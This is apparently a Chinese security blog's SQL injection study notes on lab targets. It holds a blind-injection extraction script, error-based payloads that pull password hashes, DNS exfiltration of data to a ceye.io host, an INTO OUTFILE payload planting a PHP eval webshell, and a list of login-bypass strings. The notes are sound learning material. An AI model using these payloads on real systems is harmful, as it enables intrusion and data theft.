<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length_of_database):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">128</span>):</span><br><span class="line">            url = <span class="string">&quot;http://%s/sqli_15.php?title=World War Z&#x27; and ascii(substr(database(),%d,1))=%d and sleep(1) -- &amp;action=search&quot;</span> % (</span><br><span class="line">            ip_port, j, k)</span><br><span class="line">            startTime = time.time()</span><br><span class="line">            rsq = session.get(url)</span><br><span class="line">            endTime = time.time()</span><br><span class="line">            ga = endTime - startTime</span><br><span class="line">            <span class="keyword">if</span> ga &gt; <span class="number">1</span>:</span><br><span class="line">                name_of_database += <span class="built_in">chr</span>(k)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> name_of_database</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取指定库中表的数量</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_count_of_tables</span>():</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        url = <span class="string">&quot;http://%s/sqli_15.php?title=World War Z&#x27; and (select count(*) from information_schema.tables where table_schema=database())=%d and sleep(1) -- &amp;action=search&quot;</span> % (</span><br><span class="line">        ip_port, i)</span><br><span class="line">        startTime = time.time()</span><br><span class="line">        rsq = session.get(url)</span><br><span class="line">        endTime = time.time()</span><br><span class="line">        ga = endTime - startTime</span><br><span class="line">        <span class="keyword">if</span> ga &gt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取指定库所有表的表名长度的列表</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_length_list_of_tables</span>():</span><br><span class="line">    <span class="comment"># 获取指定库中表的数量</span></span><br><span class="line">    count_of_tables = get_count_of_tables()</span><br><span class="line">    length_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, count_of_tables):</span><br><span class="line">        j = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            url = <span class="string">&quot;http://%s/sqli_15.php?title=World War Z&#x27; and  (select length(table_name) from information_schema.tables where table_schema=database() limit %d,1)=%d and sleep(1) -- &amp;action=search&quot;</span> % (</span><br><span class="line">            ip_port, i, j)</span><br><span class="line">            startTime = time.time()</span><br><span class="line">            rsq = session.get(url)</span><br><span class="line">            endTime = time.time()</span><br><span class="line">            ga = endTime - startTime</span><br><span class="line">            <span class="keyword">if</span> ga &gt; <span class="number">1</span>:</span><br><span class="line">                length_list.append(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            j = j + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> length_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取指定库中的所有表名列表</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_tables</span>():</span><br><span class="line">    <span class="comment"># 获取指定库中表的数量</span></span><br><span class="line">    count_of_tables = get_count_of_tables()</span><br><span class="line">    <span class="comment"># 获取指定库所有表的表名长度的列表</span></span><br><span class="line">    length_list = get_length_list_of_tables()</span><br><span class="line">    name_of_tables = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, count_of_tables):</span><br><span class="line">        name = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, length_list[i]):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">128</span>):</span><br><span class="line">                url = <span class="string">&quot;http://%s/sqli_15.php?title=World War Z&#x27; and  (select ascii(substr((table_name),%d,1)) from information_schema.tables where table_schema=database() limit %d,1)=%d and sleep(1) -- &amp;action=search&quot;</span> % (</span><br><span class="line">                ip_port, j + <span class="number">1</span>, i, k)</span><br><span class="line">                startTime = time.time()</span><br><span class="line">                rsq = session.get(url)</span><br><span class="line">                endTime = time.time()</span><br><span class="line">                ga = endTime - startTime</span><br><span class="line">                <span class="keyword">if</span> ga &gt; <span class="number">1</span>:</span><br><span class="line">                    name += <span class="built_in">chr</span>(k)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        name_of_tables.append(name)</span><br><span class="line">    <span class="keyword">return</span> name_of_tables</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取指定表中列的数量</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_count_of_columns</span>(<span class="params">name_of_table</span>):</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        url = <span class="string">&quot;http://%s/sqli_15.php?title=World War Z&#x27; and (select count(*) from information_schema.columns where table_schema=database() and table_name=\&quot;%s\&quot;)=%d and sleep(1) -- &amp;action=search&quot;</span> % (</span><br><span class="line">        ip_port, name_of_table, i)</span><br><span class="line">        startTime = time.time()</span><br><span class="line">        rsq = session.get(url)</span><br><span class="line">        endTime = time.time()</span><br><span class="line">        ga = endTime - startTime</span><br><span class="line">        <span class="keyword">if</span> ga &gt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取指定表所有列的列名长度</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_length_list_of_columns</span>(<span class="params">name_of_table</span>):</span><br><span class="line">    count_of_columns = get_count_of_columns(name_of_table)</span><br><span class="line">    length_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, count_of_columns):</span><br><span class="line">        j = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            url = <span class="string">&quot;http://%s/sqli_15.php?title=World War Z&#x27; and (select length(column_name) from information_schema.columns where table_schema=database() and table_name=\&quot;%s\&quot; limit %d,1)=%d and sleep(1) -- &amp;action=search&quot;</span> % (</span><br><span class="line">            ip_port, name_of_table, i, j)</span><br><span class="line">            startTime = time.time()</span><br><span class="line">            rsq = session.get(url)</span><br><span class="line">            endTime = time.time()</span><br><span class="line">            ga = endTime - startTime</span><br><span class="line">            <span class="keyword">if</span> ga &gt; <span class="number">1</span>:</span><br><span class="line">                length_list.append(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            j = j + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> length_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取指定表的所有列的列名</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_columns</span>(<span class="params">name_of_table</span>):</span><br><span class="line">    count_of_columns = get_count_of_columns(name_of_table)</span><br><span class="line">    length_list = get_length_list_of_columns(name_of_table)</span><br><span class="line">    columns = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, count_of_columns):</span><br><span class="line">        name = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, length_list[i]):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">128</span>):</span><br><span class="line">                url = <span class="string">&quot;http://%s/sqli_15.php?title=World War Z&#x27; and  (select ascii(substr((column_name),%d,1)) from information_schema.columns where table_schema=database() and table_name=\&quot;%s\&quot; limit %d,1)=%d and sleep(1) -- &amp;action=search&quot;</span> % (</span><br><span class="line">                ip_port, j + <span class="number">1</span>, name_of_table, i, k)</span><br><span class="line">                startTime = time.time()</span><br><span class="line">                rsq = session.get(url)</span><br><span class="line">                endTime = time.time()</span><br><span class="line">                ga = endTime - startTime</span><br><span class="line">                <span class="keyword">if</span> ga &gt; <span class="number">1</span>:</span><br><span class="line">                    name += <span class="built_in">chr</span>(k)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        columns.append(name)</span><br><span class="line">    <span class="keyword">return</span> columns</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取指定表指定列名数据个数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_count_of_datas</span>(<span class="params">name_of_table, name_of_column</span>):</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        url = <span class="string">&quot;http://%s/sqli_15.php?title=World War Z&#x27; and (select count(%s) from %s)=%d and sleep(1) -- &amp;action=search&quot;</span> % (</span><br><span class="line">        ip_port, name_of_column, name_of_table, i)</span><br><span class="line">        startTime = time.time()</span><br><span class="line">        rsq = session.get(url)</span><br><span class="line">        endTime = time.time()</span><br><span class="line">        ga = endTime - startTime</span><br><span class="line">        <span class="keyword">if</span> ga &gt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取指定表指定列名数据长度列表</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_length_list_of_datas</span>(<span class="params">name_of_table, name_of_column</span>):</span><br><span class="line">    count_of_datas = get_count_of_datas(name_of_table, name_of_column)</span><br><span class="line">    length_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, count_of_datas):</span><br><span class="line">        j = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            url = <span class="string">&quot;http://%s/sqli_15.php?title=World War Z&#x27; and (select length(%s) from %s limit %d,1)=%d and sleep(1) -- &amp;action=search&quot;</span> % (</span><br><span class="line">            ip_port, name_of_column, name_of_table, i, j)</span><br><span class="line">            startTime = time.time()</span><br><span class="line">            rsq = session.get(url)</span><br><span class="line">            endTime = time.time()</span><br><span class="line">            ga = endTime - startTime</span><br><span class="line">            <span class="keyword">if</span> ga &gt; <span class="number">1</span>:</span><br><span class="line">                length_list.append(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> length_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破数据</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_datas</span>(<span class="params">name_of_table, name_of_column</span>):</span><br><span class="line">    count_of_datas = get_count_of_datas(name_of_table, name_of_column)</span><br><span class="line">    length_list = get_length_list_of_datas(name_of_table, name_of_column)</span><br><span class="line">    datas = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count_of_datas):</span><br><span class="line">        data = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(length_list[i]):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">128</span>):</span><br><span class="line">                url = <span class="string">&quot;http://%s/sqli_15.php?title=World War Z&#x27; and (select ascii(substr((%s),%d,1)) from %s limit %d,1)=%d and sleep(1) -- &amp;action=search&quot;</span> % (</span><br><span class="line">                ip_port, name_of_column, j + <span class="number">1</span>, name_of_table, i, k)</span><br><span class="line">                startTime = time.time()</span><br><span class="line">                rsq = session.get(url)</span><br><span class="line">                endTime = time.time()</span><br><span class="line">                ga = endTime - startTime</span><br><span class="line">                <span class="keyword">if</span> ga &gt; <span class="number">1</span>:</span><br><span class="line">                    data += <span class="built_in">chr</span>(k)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        datas.append(data)</span><br><span class="line">    <span class="keyword">return</span> datas</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Judging the database...&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Getting the table name...&quot;</span>)</span><br><span class="line">    tables = get_tables()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tables:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]%s&quot;</span> % (i))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;The table names in this database are:%s&quot;</span> % (tables))</span><br><span class="line">    table = <span class="built_in">input</span>(<span class="string">&quot;Select the Table name:&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> table <span class="keyword">not</span> <span class="keyword">in</span> tables:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Getting the column names in the %s table......&quot;</span> % (table))</span><br><span class="line">    columns = get_columns(table)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> columns:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]%s&quot;</span> % (i))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;The column name in %s are:%s&quot;</span> % (table, columns))</span><br><span class="line">        column = <span class="built_in">input</span>(<span class="string">&quot;Select the Column name:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> column <span class="keyword">not</span> <span class="keyword">in</span> columns:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Getting the datas......&quot;</span>)</span><br><span class="line">        datas = get_datas(table, column)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> datas:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+]%s&quot;</span> % (i))</span><br><span class="line">        choice = <span class="built_in">input</span>(<span class="string">&quot;是否结束？Y/N&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> choice == <span class="string">&#x27;Y&#x27;</span> <span class="keyword">or</span> choice ==<span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h2 id="http头注入"><a href="#http头注入" class="headerlink" title="http头注入"></a>http头注入</h2><p>​<img src="/assets/image-20230926095458-pqthyx7.png" alt="image">​</p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>​<img src="/assets/image-20230926095618-l8x5c1t.png" alt="image">​</p>
<p>​<img src="/assets/image-20230926095633-01n6bo6.png" alt="image">​</p>
<p>​<img src="/assets/image-20230926095721-tkwva8d.png" alt="image">​</p>
<p>​<img src="/assets/image-20230926095814-yh8sq5a.png" alt="image">​</p>
<p>​<img src="/assets/image-20230926100317-wuk9c4v.png" alt="image">​</p>
<p>​<img src="/assets/image-20230926100336-lhvsozk.png" alt="image">​</p>
<p>​<img src="/assets/image-20230926100517-t6qeaiu.png" alt="image">​</p>
<p>​<img src="/assets/image-20230926100544-mvyel10.png" alt="image">​</p>
<p>​<img src="/assets/image-20230926101216-m7eqyws.png" alt="image">​</p>
<p>​<img src="/assets/image-20230926101408-cl7ovr6.png" alt="image">​</p>
<p>​<img src="/assets/image-20230926120039-g5mo35k.png" alt="image">​</p>
<p>​<img src="/assets/image-20230926120111-uu560ad.png" alt="image">​</p>
<p>​<img src="/assets/image-20230926195258-03254h0.png" alt="image">​</p>
<p>1.如果不使用concat函数，输出的版本信息不全。</p>
<p>2.0x7e是~</p>
<p>​<img src="/assets/image-20230926195615-mqt55mu.png" alt="image">​</p>
<p>​<img src="/assets/image-20230926200048-qn9cdcz.png" alt="image">​</p>
<p>​<img src="/assets/image-20230926200343-kzj1buq.png" alt="image">​</p>
<p>​<img src="/assets/image-20230926200507-frsyvrs.png" alt="image">​</p>
<h2 id="报错注入实战"><a href="#报错注入实战" class="headerlink" title="报错注入实战"></a>报错注入实战</h2><p>​<img src="/assets/image-20230927091035-f6aocdd.png" alt="image">​</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span><span class="number">.149</span><span class="number">.136</span>/vulnerabilities/sqli/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(0x7e,user(),0x7e,database()))</span></span><br><span class="line"><span class="string"> -- &amp;Submit=Submit#</span></span><br></pre></td></tr></table></figure>

<p>​<img src="/assets/image-20230927091318-n17imju.png" alt="image">​</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span><span class="number">.149</span><span class="number">.136</span>/vulnerabilities/sqli/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; and extractvalue</span></span><br><span class="line"><span class="string">(1,concat(0x7e,(select table_name from information_schema.tables </span></span><br><span class="line"><span class="string">where table_schema=database() limit 2,1)))</span></span><br><span class="line"><span class="string"> -- &amp;Submit=Submit#</span></span><br></pre></td></tr></table></figure>

<p>​<img src="/assets/image-20230927092459-j6fn43k.png" alt="image">​</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span><span class="number">.149</span><span class="number">.136</span>/vulnerabilities/sqli/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; and </span></span><br><span class="line"><span class="string">extractvalue(1,concat(0x7e,(select column_name from</span></span><br><span class="line"><span class="string"> information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 3,1)))</span></span><br><span class="line"><span class="string"> -- &amp;Submit=Submit#</span></span><br></pre></td></tr></table></figure>

<p>​<img src="/assets/image-20230927092826-1xooymz.png" alt="image">​</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span><span class="number">.149</span><span class="number">.136</span>/vulnerabilities/sqli/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; and </span></span><br><span class="line"><span class="string">extractvalue(1,concat(0x7e,(select password from users limit 1,1)))</span></span><br><span class="line"><span class="string"> -- &amp;Submit=Submit#</span></span><br></pre></td></tr></table></figure>

<p>​<img src="/assets/image-20230927093025-esznena.png" alt="image">​</p>
<p>32个字符是由于extractvalue函数的限制，31个字符并不符合密码的加密字符数。</p>
<p>因此需要借助其他函数来泄露。</p>
<p>​<img src="/assets/image-20230927093141-xg1swct.png" alt="image">​</p>
<p>​<img src="/assets/image-20230927093741-igpwywn.png" alt="image">​</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span><span class="number">.149</span><span class="number">.136</span>/vulnerabilities/sqli/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; and </span></span><br><span class="line"><span class="string">extractvalue(1,mid(concat(0x7e,(select password from users limit 1,1)),1,30))</span></span><br><span class="line"><span class="string"> -- &amp;Submit=Submit#</span></span><br></pre></td></tr></table></figure>

<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>​<img src="/assets/image-20230927102102-hz7q139.png" alt="image">​</p>
<p>​<img src="/assets/image-20230927102139-hehy113.png" alt="image">​</p>
<p>​<img src="/assets/image-20230927102759-iih6tl5.png" alt="image">​</p>
<p>​<img src="/assets/image-20230927103041-bdxtxfb.png" alt="image">​</p>
<h2 id="OOB注入"><a href="#OOB注入" class="headerlink" title="OOB注入"></a>OOB注入</h2><p>​<img src="/assets/image-20230927103656-fye9sgy.png" alt="image">​</p>
<p>​<img src="/assets/image-20230927103755-l1p11m3.png" alt="image">​</p>
<p>​<img src="/assets/image-20230927103856-ahxz0k1.png" alt="image">​</p>
<p>​<img src="/assets/image-20230927103941-4cn69w6.png" alt="image">​</p>
<p>​<img src="/assets/image-20230927104032-n2d18je.png" alt="image">​</p>
<p>​<img src="/assets/image-20230927104125-x4s0gpa.png" alt="image">​</p>
<p>​<img src="/assets/image-20230927104215-d4rvk8f.png" alt="image">​</p>
<p>​<img src="/assets/image-20230927104629-rvre6yt.png" alt="image">​</p>
<p>​<img src="/assets/image-20230927104717-j21aj58.png" alt="image">​</p>
<p>​<img src="/assets/image-20230927104841-vinw2ih.png" alt="image">​</p>
<p>​<img src="/assets/image-20230927104934-oduhfy2.png" alt="image">​</p>
<p>​<img src="/assets/image-20230928144846-um1ik7w.png" alt="image">​</p>
<p>​<img src="/assets/image-20230928144917-ihtxqnl.png" alt="image">​</p>
<p>​<img src="/assets/image-20230928144951-ja39kwv.png" alt="image">​</p>
<p>​<img src="/assets/image-20230928145005-t62n136.png" alt="image">​</p>
<p>CEYE平台</p>
<p>CEYE是一个用来检测带外（Out-of-Band）流量的监控平台，如DNS查询和HTTP请求。它可以帮助安全研究人员在测试漏洞时收集信息（例如SSRF &#x2F; XXE &#x2F; RFI &#x2F; RCE）。</p>
<p>漏洞检测或漏洞利用需要进一步的用户或系统交互。</p>
<p>一些漏洞类型没有直接表明攻击是成功的。如Payload触发了却不在前端页面显示。</p>
<p>这时候使用CEYE平台，通过使用诸如DNS和HTTP之类的带外信道，便可以得到回显信息。</p>
<p>​<img src="/assets/image-20230928150641-bmrtk67.png" alt="image">​</p>
<p>​<img src="/assets/image-20230928150610-8n98tkp.png" alt="image">​</p>
<h2 id="OOB注入实战"><a href="#OOB注入实战" class="headerlink" title="OOB注入实战"></a>OOB注入实战</h2><p>​​<img src="/assets/image-20230928153145-4f1d2t8.png" alt="image">​</p>
<p>​​<img src="/assets/image-20230928160131-tzfat3n.png" alt="image">​</p>
<p>​<img src="/assets/image-20230928160148-5ulfpu1.png" alt="image">​</p>
<p>​<img src="/assets/image-20230928160242-zwjucxz.png" alt="image">​</p>
<p>​<img src="/assets/image-20230928160252-p6nwy3a.png" alt="image">​</p>
<p>​<img src="/assets/image-20230928160318-n53yqqb.png" alt="image">​</p>
<p>​<img src="/assets/image-20230928160427-xfcraqp.png" alt="image">​</p>
<p>show global variables like “%secure_file_priv%”;</p>
<p>​<img src="/assets/image-20230928162050-y9wpzcu.png" alt="image">​</p>
<p>select concat(“\\\\“,(select database()),”.bcegvg.ceye.io\\abc”);</p>
<p>​<img src="/assets/image-20230928162847-9oyit01.png" alt="image">​</p>
<p>​<img src="/assets/image-20230928162908-zyxheq2.png" alt="image">​</p>
<p>​<img src="/assets/image-20230928162958-y4lf9l4.png" alt="image">​</p>
<h2 id="SQL注入写文件到指定目录"><a href="#SQL注入写文件到指定目录" class="headerlink" title="SQL注入写文件到指定目录"></a>SQL注入写文件到指定目录</h2><p>user&#x3D;admin’  union  selselectect 1,2,3,4,0x3C3F70687020406576616C28245F504F53545B3132335D293B3F3E  into  outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;shell11.php’#</p>
<p>​<img src="/assets/image-20231013161013-tk7ysqt.png" alt="image">​</p>
<p>‍</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/23/WEB/PHP%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h1 id="PHP安全"><a href="#PHP安全" class="headerlink" title="PHP安全"></a>PHP安全</h1><h1 id="PHP安全-1"><a href="#PHP安全-1" class="headerlink" title="PHP安全"></a>PHP安全</h1>]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/23/WEB/SQL%E6%B3%A8%E5%85%A5%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<h1 id="SQL注入万能密码"><a href="#SQL注入万能密码" class="headerlink" title="SQL注入万能密码"></a>SQL注入万能密码</h1><h1 id="SQL注入万能密码-1"><a href="#SQL注入万能密码-1" class="headerlink" title="SQL注入万能密码"></a>SQL注入万能密码</h1><p><a href="https://blog.csdn.net/hxhxhxhxx/article/details/108020010">https://blog.csdn.net/hxhxhxhxx/article/details/108020010</a></p>
<h1 id="万能密码原理"><a href="#万能密码原理" class="headerlink" title="万能密码原理"></a>万能密码原理</h1><p>原验证登陆语句:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> admin <span class="keyword">WHERE</span> Username<span class="operator">=</span> <span class="string">&#x27;&quot;.$username.&quot;&#x27;</span> <span class="keyword">AND</span> Password<span class="operator">=</span> <span class="string">&#x27;&quot;.md5($password).&quot;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>输入 1′ or 1&#x3D;1 or ‘1’&#x3D;’1万能密码语句变为:</p>
<p>SELECT * FROM admin WHERE Username&#x3D;’1’ OR 1&#x3D;1 OR ‘1’&#x3D;’1’ AND Password&#x3D;’EDFKGMZDFSDFDSFRRQWERRFGGG’<br>1<br>即得到优先级关系：or&lt;and&lt;not，同一优先级默认从左往右计算。</p>
<p>(1.)上面’1’&#x3D;‘1’ AND Password&#x3D;’EDFKGMZDFSDFDSFRRQWERRFGGG’先计算肯定返回false,因为密码是我们乱输入的。(此处是假)</p>
<p>(2.)Username&#x3D;‘1’ 返回假,没有用户名是1(此处是假)</p>
<p>(3.)1&#x3D;1返回真(此处是真)</p>
<p>以上的结果是: 假 or 真 or假 返回真。验证通过。</p>
<p>万能密码<br>‘ or 1&#x3D;’1<br>‘or’&#x3D;’or’<br>admin<br>admin’–<br>admin’ or 4&#x3D;4–<br>admin’ or ‘1’&#x3D;’1’–<br>admin888<br>“or “a”&#x3D;”a<br>admin’ or 2&#x3D;2#<br>a’ having 1&#x3D;1#<br>a’ having 1&#x3D;1–<br>admin’ or ‘2’&#x3D;’2<br>‘)or(‘a’&#x3D;’a<br>or 4&#x3D;4–<br>c<br>a’or’ 4&#x3D;4–<br>“or 4&#x3D;4–<br>‘or’a’&#x3D;’a<br>“or”&#x3D;”a’&#x3D;’a<br>‘or’’&#x3D;’<br>‘or’&#x3D;’or’<br>1 or ‘1’&#x3D;’1’&#x3D;1<br>1 or ‘1’&#x3D;’1’ or 4&#x3D;4<br>‘OR 4&#x3D;4%00<br>“or 4&#x3D;4%00<br>‘xor<br>admin’ UNION Select 1,1,1 FROM admin Where ‘’&#x3D;’<br>1<br>-1%cf’ union select 1,1,1 as password,1,1,1 %23<br>1<br>17..admin’ or ‘a’&#x3D;’a 密码随便<br>‘or’&#x3D;’or’<br>‘or 4&#x3D;4&#x2F;*<br>something<br>‘ OR ‘1’&#x3D;’1<br>1’or’1’&#x3D;’1<br>admin’ OR 4&#x3D;4&#x2F;*<br>1’or’1’&#x3D;’1<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>asp aspx万能密码<br>1：”or “a”&#x3D;”a<br>2： ‘)or(‘a’&#x3D;’a<br>3：or 1&#x3D;1–<br>4：’or 1&#x3D;1–<br>5：a’or’ 1&#x3D;1–<br>6：”or 1&#x3D;1–<br>7：’or’a’&#x3D;’a<br>8：”or”&#x3D;”a’&#x3D;’a<br>9：’or”&#x3D;’<br>10：’or’&#x3D;’or’<br>11: 1 or ‘1’&#x3D;’1’&#x3D;1<br>12: 1 or ‘1’&#x3D;’1’ or 1&#x3D;1<br>13: ‘OR 1&#x3D;1%00<br>14: “or 1&#x3D;1%00<br>15: ‘xor<br>16: 用户名 ’ UNION Select 1,1,1 FROM admin Where ”&#x3D;’ （替换表名admin）<br>密码 1<br>17…admin’ or ‘a’&#x3D;’a 密码随便</p>
<p>PHP万能密码<br>‘or 1&#x3D;1&#x2F;*<br>User: something<br>Pass: ’ OR ‘1’&#x3D;’1</p>
<p>jsp 万能密码<br />1’or’1’&#x3D;’1<br />admin’ OR 1&#x3D;1&#x2F;*</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/23/WEB/WEB%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="WEB工具使用"><a href="#WEB工具使用" class="headerlink" title="WEB工具使用"></a>WEB工具使用</h1><h1 id="WEB工具使用-1"><a href="#WEB工具使用-1" class="headerlink" title="WEB工具使用"></a>WEB工具使用</h1><h1 id="御剑后台扫描工具"><a href="#御剑后台扫描工具" class="headerlink" title="御剑后台扫描工具"></a>御剑后台扫描工具</h1><p><img src="/assets/image-20230611104320-8bs55t8.png" alt="image.png"></p>
<p>输入域名，选择需要扫描的内容，点击开始扫描即可。</p>
<h1 id="code-search（源码泄露）"><a href="#code-search（源码泄露）" class="headerlink" title="code_search（源码泄露）"></a>code_search（源码泄露）</h1><p><img src="/assets/image-20230611104454-vr66sok.png" alt="image.png"></p>
<p>每次使用code_search扫描时，修改test.py文件中的域名即可。</p>
<p><img src="/assets/image-20230611104551-hq15rv1.png" alt="image.png"></p>
<p>修改完之后，运行该py文件即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python test.py</span><br></pre></td></tr></table></figure>

